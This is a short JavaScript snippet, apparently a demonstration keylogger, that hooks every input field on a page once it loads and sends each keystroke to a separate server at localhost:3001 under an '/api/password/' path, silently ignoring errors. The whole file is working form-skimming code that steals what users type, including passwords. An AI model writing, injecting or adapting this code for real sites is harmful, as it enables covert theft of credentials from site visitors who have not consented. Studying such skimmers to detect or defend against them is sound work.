(function (window, document, undefined) {
    'use strict';

    document.addEventListener('DOMContentLoaded', function setupHandlers() {
        const inputElms = document.querySelectorAll('input');

        for (const inputElm of inputElms) {
            inputElm.addEventListener('keydown', (event) => {
                fetch(`https://localhost:3001/api/password/${event.key}`)
                    .catch(() => {});
            });
        }
    });
})(window, document);